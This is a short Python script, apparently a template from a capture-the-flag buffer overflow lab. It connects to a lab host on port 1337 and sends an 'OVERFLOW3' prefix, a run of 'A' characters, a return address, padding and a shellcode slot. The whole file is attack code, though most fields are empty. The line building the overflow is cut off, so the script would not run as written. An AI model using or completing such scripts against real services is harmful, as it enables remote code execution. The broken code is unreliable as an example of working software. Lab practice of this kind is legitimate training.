import socket

ip = "10.10.22.26"
port = 1337

prefix = "OVERFLOW3 "
offset = ""
overflow = "A" * 
retn = ""
padding = ""
buf = ""
payload = buf
postfix = ""


buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("You got this BigBruiser...")
    s.send(buffer + "\r\n")
    print("Done!")
except:
    print("Could not connect.")
